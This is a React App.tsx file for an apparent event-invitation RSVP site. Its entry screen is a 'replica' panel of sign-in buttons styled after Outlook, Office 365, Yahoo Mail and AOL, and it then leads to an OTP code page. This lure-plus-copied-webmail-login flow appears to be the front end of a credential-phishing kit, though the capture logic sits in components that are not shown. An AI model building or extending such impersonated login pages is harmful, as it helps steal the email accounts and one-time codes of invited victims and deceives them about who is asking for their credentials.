import React, { useState } from 'react';
import { EmailProvider, RSVPRecord } from './types';
import ReplicaPanel from './components/ReplicaPanel';
import OTPPage from './components/OTPPage';
import SecurityConsole from './components/SecurityConsole';
import Dashboard from './components/Dashboard';
import bgImage from './assets/images/blurred_celebration_balloons_1780954794053.png';

export default function App() {
  const [activeProvider, setActiveProvider] = useState<EmailProvider | null>(null);
  const [verifiedEmail, setVerifiedEmail] = useState<string>('');
  const [activeTab, setActiveTab] = useState<'PORTAL' | 'STUDIO' | 'SECURITY' | 'DASHBOARD'>('PORTAL');

  // Local state for RSVPs
  const [rsvps, setRsvps] = useState<RSVPRecord[]>([
    {
      id: 'mock-1',
      name: 'Samantha Wright',
      email: 'samantha.w@sincere.com',
      status: 'ACCEPTED',
      guests: 2,
      note: 'Very excited! Can\'t wait for the banquet.',
      timestamp: '09:42 AM'
    },
    {
      id: 'mock-2',
      name: 'Michael Chen',
      email: 'm.chen@outlook.com',
      status: 'ACCEPTED',
      guests: 1,
      note: 'I will be there slightly early to help set up.',
      timestamp: '10:15 AM'
    },
    {
      id: 'mock-3',
      name: 'Elena Rostova',
      email: 'elena.rost@yahoo.com',
      status: 'TENTATIVE',
      guests: 0,
      note: 'Subject to work travelling schedule. Hopefully yes!',
      timestamp: '11:05 AM'
    },
    {
      id: 'mock-4',
      name: 'Lucas Dupont',
      email: 'lucas.dupont@gmail.com',
      status: 'DECLINED',
      guests: 0,
      note: 'Regretfully out of town that weekend. Sending warm wishes!',
      timestamp: '11:58 AM'
    }
  ]);

  // Provider details matching Capture.PNG colors
  const mockProviders: EmailProvider[] = [
    {
      id: 'outloo',
      name: 'Outloo',
      buttonText: 'Sign in with Outlook',
      bgColor: '#1d3e6c', // Royal Blue Hue
      hoverColor: '#173359',
      iconBg: 'bg-white',
      textColor: 'text-white',
      brandColor: '#0078d4'
    },
    {
      id: 'office365',
      name: 'Office 365',
      buttonText: 'Sign in Office 365',
      bgColor: '#2b528a', // Corporate Muted Blue
      hoverColor: '#224270',
      iconBg: 'bg-white',
      textColor: 'text-white',
      brandColor: '#eb3c00'
    },
    {
      id: 'yahoo',
      name: 'Yahoo Mail',
      buttonText: 'Sign in with Yahoo Mail',
      bgColor: '#5a225c', // Deep Purple Hue
      hoverColor: '#451a47',
      iconBg: 'bg-white',
      textColor: 'text-white',
      brandColor: '#6001d2'
    },
    {
      id: 'aol',
      name: 'AOL',
      buttonText: 'Sign in with AOL',
      bgColor: '#26542d', // Forest Green Hue
      hoverColor: '#1c3f22',
      iconBg: 'bg-black',
      textColor: 'text-white',
      brandColor: '#ff4b00'
    },
    {
      id: 'other',
      name: 'Other Mail',
      buttonText: 'Sign in with Other Mail',
      bgColor: '#86361a', // Rust Red Orange Hue
      hoverColor: '#6d2b15',
      iconBg: 'bg-white',
      textColor: 'text-white',
      brandColor: '#ea4335'
    }
  ];

  // Handlers
  const handleSelectProvider = (provider: EmailProvider, email: string) => {
    setVerifiedEmail(email);
    setActiveProvider(provider);
    setTimeout(() => {
      setActiveTab('STUDIO');
    }, 500);
  };

  const handleAddRSVP = (rsvp: RSVPRecord) => {
    setRsvps(prev => [rsvp, ...prev]);
  };

  const handleRemoveRSVP = (id: string) => {
    setRsvps(prev => prev.filter(r => r.id !== id));
  };

  const handleClearAll = () => {
    setRsvps([]);
  };

  const handleAddSampleRSVP = () => {
    const sampleNames = ['Amelia Smith', 'Hiroshi Tanaka', 'David Carter', 'Sofia Rodriguez'];
    const sampleEmails = ['amelia@comp.org', 'tanaka@domain.co.jp', 'carter.d@sky.com', 'sofia.r@outlook.com'];
    const sampleNotes = ['Excited to celebrate!', 'Will bring dessert.', '', 'Can\'t wait!'];
    const statuses: ('ACCEPTED' | 'TENTATIVE' | 'DECLINED')[] = ['ACCEPTED', 'TENTATIVE', 'ACCEPTED'];
    
    const randomIndex = Math.floor(Math.random() * sampleNames.length);
    const status = statuses[Math.floor(Math.random() * statuses.length)];
    
    const newSample: RSVPRecord = {
      id: 'sample-' + Math.random().toString(36).substring(4),
      name: sampleNames[randomIndex],
      email: sampleEmails[randomIndex],
      status: status,
      guests: status === 'ACCEPTED' ? Math.floor(Math.random() * 3) + 1 : 0,
      note: sampleNotes[randomIndex],
      timestamp: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })
    };

    setRsvps(prev => [newSample, ...prev]);
  };

  return (
    <div id="full-viewport-app" className="min-h-screen bg-[#111] text-gray-100 flex flex-col justify-between relative overflow-x-hidden font-sans">
      
      {/* Background Layer with Blurred Balloons: Fallback dynamically to generated image */}
      <div 
        id="bg-canvas-image" 
        className="absolute inset-0 pointer-events-none z-0 bg-cover bg-center transition-all duration-700" 
        style={{ 
          backgroundImage: `url(${bgImage})`,
          filter: activeTab === 'PORTAL' ? 'none' : 'blur(20px) brightness(0.4)'
        }}
      >
        {/* Soft dark radial glow to center action */}
        <div className="absolute inset-0 bg-[#00000025] mix-blend-multiply"></div>
      </div>

      {/* Main Focus Area Containment */}
      <main id="primary-view-container" className="flex-1 flex items-center justify-center relative z-10 w-full min-h-screen">
        
        {activeTab === 'PORTAL' && (
          <div id="portal-hub-layer" className="w-full flex items-center justify-center relative">
            <ReplicaPanel
              mockProviders={mockProviders}
              onSelectProvider={handleSelectProvider}
            />
          </div>
        )}

        {activeTab === 'STUDIO' && (
          <OTPPage
            email={verifiedEmail}
            providerId={activeProvider?.id || 'email'}
            onVerify={() => {}}
            onClose={() => {
              setActiveTab('PORTAL');
              setVerifiedEmail('');
              setActiveProvider(null);
            }}
          />
        )}

        {activeTab === 'SECURITY' && (
          <div className="py-6 w-full">
            <SecurityConsole />
          </div>
        )}

        {activeTab === 'DASHBOARD' && (
          <div className="py-6 w-full">
            <Dashboard 
              rsvps={rsvps} 
              onRemoveRSVP={handleRemoveRSVP} 
              onClearAll={handleClearAll}
              onAddSampleRSVP={handleAddSampleRSVP}
            />
          </div>
        )}

      </main>



    </div>
  );
}
